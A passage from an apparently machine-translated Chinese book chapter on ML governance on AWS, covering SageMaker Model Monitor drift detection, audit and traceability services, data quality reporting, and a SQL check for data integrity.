+<li><strong class="bold">特征属性漂移</strong>:这是通过比较以下内容检测到的<a id="_idIndexMarker1261"/>:<ul><li><strong class="bold">[" PROPERTIES "-A]</strong>:基线数据集的特征分布值</li>
+
+<li><strong class="bold">[" PROPERTIES "-B]</strong>:捕获的ML推理数据的特征分布值</li>
+
+</ul></li>
+
+</ul>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">为了更容易理解这些概念，让我们讨论一个简单的例子来说明<code>age</code>和<code>salary</code>是如何实现的。然后，我们使用这个训练数据集作为SageMaker模型监视器的基线。在分析数据集之后，SageMaker模型监视器返回了一组建议的约束条件，这些约束条件要求年龄和工资值始终为正值。然后将ML模型部署到SageMaker推理端点，该端点被配置为收集包含输入和输出值(即年龄输入和预测工资值)的请求和响应数据。然后，我们配置了一个SageMaker模型监视器“schedule ”,它会触发一个处理作业。这将分析收集的请求和响应数据，并检查是否违反了配置的约束。如果收集的数据包含年龄输入值的负值，SageMaker Model Monitor应该能够检测到这一点，并在计划的处理作业完成运行后标记这一违规。</p>
+
+<p>一旦分析了检测到的<a id="_idIndexMarker1264"/>不一致和问题，数据科学团队可能会根据问题执行以下一项或多项修复或更正:</p>
+
+<ul>
+
+<li>修复系统中向ML推理端点发送“坏数据”的问题。</li>
+
+<li>用新模型替换已部署的模型。</li>
+
+<li>纠正模型培训和部署管道中的现有问题。</li>
+
+</ul>
+
+<p>现在，让我们看看可追溯性、可观察性和审计。</p>
+
+<h2 id="_idParaDest-195">可追溯性、可观察性和审计</h2>
+
+<p>我们必须能够审计和检查ML实验或<a id="_idIndexMarker1265"/>部署的每一步中发生的一切，不管这些步骤是手动还是自动执行的。这使我们能够轻松识别<a id="_idIndexMarker1267"/>并修复问题，使系统返回到所需的配置状态。如果一个ML系统处于“不稳定”状态，ML工程师必须能够使用正确的工具来快速排除故障并解决问题。</p>
+
+<p>假设您的团队已经开始使用自动化的ML管道，该管道接受数据集作为输入，并生成二进制分类ML模型作为输出(在经历管道中的所有步骤之后)。几个星期以来，ML管道运行良好...直到团队决定在管道中间的某个地方引入额外的数据处理步骤。该团队注意到，不管输入值是多少，管道<em class="italic">生成的大多数二进制分类模型总是</em>返回一个<code>0</code>！在实现管道中的更改之前，所有生成的模型都已经返回了<em class="italic">0</em>和<em class="italic">1</em>(这是所期望的)。作为ML的工程师，你决定更深入地调查发生了什么...却发现ML管道步骤没有生成日志，这增加了故障排除的难度。同时，您发现没有合适的跟踪机制来帮助团队“连接<a id="_idIndexMarker1268"/>点”并分析为什么生成的模型总是为分类结果生成一个<code>0</code>。在<a id="_idIndexMarker1270"/>意识到需要几周的时间来排查和修复现有的一系列问题之后，您的团队决定停止使用自动化ML管道(这需要几个月的时间来构建和完善)并扔掉它。<em class="italic">哎哟！</em>如果跟踪和审计机制到位，自动化ML管道可以更快地恢复到稳定状态。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">不要让这种事情发生在你和你的团队身上！在构建ML管道时，使用正确的工具非常重要。有关ML管道的更多信息，请随时查看第10章<a href="B18638_10.xhtml#_idTextAnchor215"><em class="italic"/></a>，<em class="italic">亚马逊EKS上Kubeflow的机器学习管道</em>，以及<a href="B18638_11.xhtml#_idTextAnchor231"> <em class="italic">第11章</em> </a>，【SageMaker管道的机器学习管道。</p>
+
+<p>作为一名ML工程师，你需要知道这些类型需求的“工具”。在AWS中对ML环境和系统执行审计工作时，我们可以使用以下服务和功能:</p>
+
+<ul>
+
+<li><strong class="bold"> AWS CloudTrail </strong>:这可以<a id="_idIndexMarker1271"/>用于捕获和记录AWS帐户中的任何配置更改。</li>
+
+<li><strong class="bold"> AWS CloudTrail Lake </strong>:这是一个用于CloudTrail数据分析的<a id="_idIndexMarker1272"/>托管数据湖。</li>
+
+<li><strong class="bold"> Amazon CloudWatch日志</strong>:包含来自SageMaker、EC2、Redshift等各种服务<a id="_idIndexMarker1273"/>的活动日志。</li>
+
+<li><strong class="bold"> Amazon Athena CloudWatch连接器</strong>:这使得CloudWatch日志数据能够在Amazon Athena中使用SQL语句进行<a id="_idIndexMarker1274"/>查询。</li>
+
+<li><strong class="bold"> SageMaker模型注册中心</strong>:这个<a id="_idIndexMarker1275"/>可以用来跟踪模型部署批准。</li>
+
+<li><strong class="bold"> SageMaker实验</strong>和<strong class="bold"> SageMaker血统</strong>:在SageMaker中执行实验<a id="_idIndexMarker1277"/>后，这些可以用来审计和<a id="_idIndexMarker1276"/>跟踪模型血统。</li>
+
+<li><strong class="bold"> AWS审计管理器</strong>:这可以<a id="_idIndexMarker1278"/>用于简化和加速AWS账户的审计过程。</li>
+
+<li><strong class="bold"> AWS X射线</strong>:这可以<a id="_idIndexMarker1279"/>用于跟踪整个应用程序中的请求，并排除分布式应用程序中的性能瓶颈。</li>
+
+</ul>
+
+<p>我们不会深入<a id="_idIndexMarker1280"/>这些服务如何使用的细节，所以请随意查看本章末尾的<em class="italic">延伸阅读</em>部分<a id="_idIndexMarker1282"/>了解更多细节。</p>
+
+<h2 id="_idParaDest-196"><a id="_idTextAnchor209"/>数据质量分析和报告</h2>
+
+<p>能够尽早发现数据质量问题将有助于我们管理与这些问题相关的任何风险。同时，我们将能够对ML系统的实施、设置或架构进行任何所需的短期和长期修正。在本节中，我们将讨论一些可能的解决方案，用于分析用于训练和推理的数据的质量。</p>
+
+<p>第一个解决方案涉及使用定制代码和开源包来准备和生成数据质量报告。在<a href="B18638_01.xhtml#_idTextAnchor017"> <em class="italic">第一章</em> </a>、<em class="italic">AWS上的ML工程介绍</em>中，我们使用了一个名为<code>pandas_profiling</code>的Python库来自动分析我们的数据并生成profile报告。请注意，我们也可以使用类似的库和包。当然，使用这种方法，我们必须自己管理基础设施方面。如果我们想升级这个设置，我们可以选择在使用<strong class="bold"> AWS Lambda </strong>的无服务器功能中部署我们的定制数据<a id="_idIndexMarker1284"/>配置脚本，或者在使用<strong class="bold"> Amazon ECS </strong>的<a id="_idIndexMarker1285"/>容器化应用程序中部署。</p>
+
+<p>另一个可行的选择是避免我们自己构建定制的解决方案，而简单地使用一个现有的服务，让我们专注于我们的目标和责任。在<a href="B18638_05.xhtml#_idTextAnchor105"> <em class="italic">第五章</em> </a>、<em class="italic">实用数据处理和分析</em>中，我们使用<strong class="bold"> AWS Glue DataBrew </strong>来加载、配置和<a id="_idIndexMarker1286"/>处理我们的数据。运行配置文件作业后，我们可以访问额外的分析和信息，包括缺失的<a id="_idIndexMarker1287"/>单元格值、数据分布统计和重复行。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">推断过程中也可能出现数据质量问题。一旦我们将一个ML模型部署到一个推理端点中，这个模型就可以对带有缺失值和数据质量问题的请求有效负载做出预测。在<a href="B18638_08.xhtml#_idTextAnchor172"> <em class="italic">第8章</em> </a>、<em class="italic">模型监控和管理解决方案</em>中，我们启用了数据捕获，并自动化了检测通过SageMaker实时推理端点的数据质量违规的流程。我们安排了一个模型监控处理作业，该作业将处理数据，然后生成一个包含不同相关违规统计信息的自动报告(大约每小时一次)。</p>
+
+<h2 id="_idParaDest-197"><a id="_idTextAnchor210"/>数据完整性管理</h2>
+
+<p>维护和管理数据完整性不是一件容易的事情。检测和修复数据质量问题(如缺失值和重复行)只是挑战的第一部分。管理数据完整性问题是下一个挑战，因为我们需要更进一步，确保存储在数据库中的数据是完整、准确和一致的。</p>
+
+<p>在<a href="B18638_04.xhtml#_idTextAnchor079"> <em class="italic">第4章</em> </a>、<em class="italic">AWS上的无服务器数据管理</em>中，我们将一个合成数据集加载到一个数据仓库(使用红移无服务器)和一个数据湖(使用亚马逊雅典娜、亚马逊S3和AWS Glue)。当我们在数据集上执行一些示例查询时，我们只是假设不需要担心数据质量和数据完整性问题。让我们回忆一下，我们的数据集包含大约21列，其中包括一些“派生”列。“派生”列的一个很好的例子是<code>has_booking_changes</code>列。如果<code>booking_changes</code>列值大于<code>0</code>，则<code>has_booking_changes</code>列值预计为<code>True</code>。否则<code>has_booking_changes</code>的值应该是<code>False</code>。为了识别<code>booking_changes</code>列值与<code>has_booking_changes</code>列值不匹配的记录，我们在无服务器数据仓库(Redshift Serverless)中执行了以下查询:</p>
+
+<pre class="source-code"><strong class="bold">SELECT booking_changes, has_booking_changes, * </strong>
+
+<strong class="bold">FROM dev.public.bookings </strong>
+
+<strong class="bold">WHERE </strong>
+
+<strong class="bold">(booking_changes=0 AND has_booking_changes='True') </strong>
+
+<strong class="bold">OR </strong>
+
+<strong class="bold">(booking_changes&gt;0 AND has_booking_changes='False');</strong></pre>
+
+<p>以下是解决这个问题的几种方法:</p>
+
+<ul>
+
+<li>如果只有少数记录受到影响(相对于记录总数)，那么我们可以(软)删除受影响的记录，并从数据处理工作流的未来步骤中排除这些记录。请注意，由于排除记录可能会显著影响数据分析结果和ML模型性能(如果数据集用于训练ML模型)，因此应谨慎操作。</li>
+
+<li>我们可以执行一个<code>UPDATE</code>语句来修正<code>booking_changes</code>列的值。</li>
+
+</ul>
+
+<p>请注意，另一个<a id="_idIndexMarker1289"/>可能的长期解决方案是在数据加载到数据仓库或数据湖之前，执行所需的数据完整性检查和纠正。这意味着数据仓库或数据湖中的数据在初始数据加载时应该已经是“干净的”,我们可以在这些集中式数据存储中安全地执行查询和其他操作。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">除此之外，还必须审查与数据交互的应用程序和系统。请注意，即使我们清理了数据，连接的应用程序仍有可能引入一系列新的数据完整性问题，因为根本原因尚未解决。</p>
+
+<p><em class="italic">差不多就是这样！</em>在这一点上，我们应该有更广泛的选择来解决建立ML治理时的各种问题和挑战。请随意再读一遍这一章，以帮助你更深入地理解不同的概念和技术。</p>
+
+<h1 id="_idParaDest-198"><a id="_idTextAnchor211"/>总结</h1>
+
+<p>在本章中，我们讨论了管理ML环境和系统的整体安全性、合规性和治理的各种策略和解决方案。我们首先通过几个最佳实践来提高ML环境的安全性和合规性。之后，我们讨论了如何保护数据隐私和模型隐私的相关技术。在本章末尾，我们介绍了使用各种AWS服务建立ML治理的不同解决方案。</p>
+
+<p>在下一章中，我们将快速介绍<strong class="bold"> MLOps管道</strong>，然后使用<strong class="bold"> Kubeflow管道</strong>深入研究AWS中的自动化ML工作流。</p>
+
+<h1 id="_idParaDest-199"><a id="_idTextAnchor212"/>延伸阅读</h1>
+
+<p>有关本章涵盖的主题的更多信息，请随时查阅以下资源:</p>
+
+<ul>
+
+<li><em class="italic"> AWS IAM最佳实践</em>(<a href="https://aws.amazon.com/iam/resources/best-practices/">https://aws.amazon.com/iam/resources/best-practices/</a>)</li>
+
+<li><em class="italic">VPC的安全最佳实践</em>(<a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.xhtml">https://docs . AWS . Amazon . com/VPC/latest/user guide/VPC-Security-Best-Practices . XHTML</a>)</li>
+
+<li><em class="italic">AWS private link concepts</em>(<a href="https://docs.aws.amazon.com/vpc/latest/privatelink/concepts.xhtml">https://docs . AWS . Amazon . com/VPC/latest/private link/concepts . XHTML</a>)</li>
+
+<li><em class="italic"> AWS审计管理器概念</em>(<a href="https://docs.aws.amazon.com/audit-manager/latest/userguide/concepts.xhtml">https://docs . AWS . Amazon . com/Audit-Manager/latest/user guide/concepts . XHTML</a>)</li>
+
+<li><em class="italic"> AWS合规中心</em>(<a href="https://aws.amazon.com/financial-services/security-compliance/compliance-center/">https://AWS . Amazon . com/financial-services/security-Compliance/Compliance-Center/</a>)</li>
+
+<li><em class="italic">在AWS神器中下载报表</em>(<a href="https://docs.aws.amazon.com/artifact/latest/ug/downloading-documents.xhtml">https://docs . AWS . Amazon . com/Artifact/latest/ug/Downloading-documents . XHTML</a>)</li>
+
+</ul>
+
+</div>
+
+</div>
+
+
+
+</body></html>
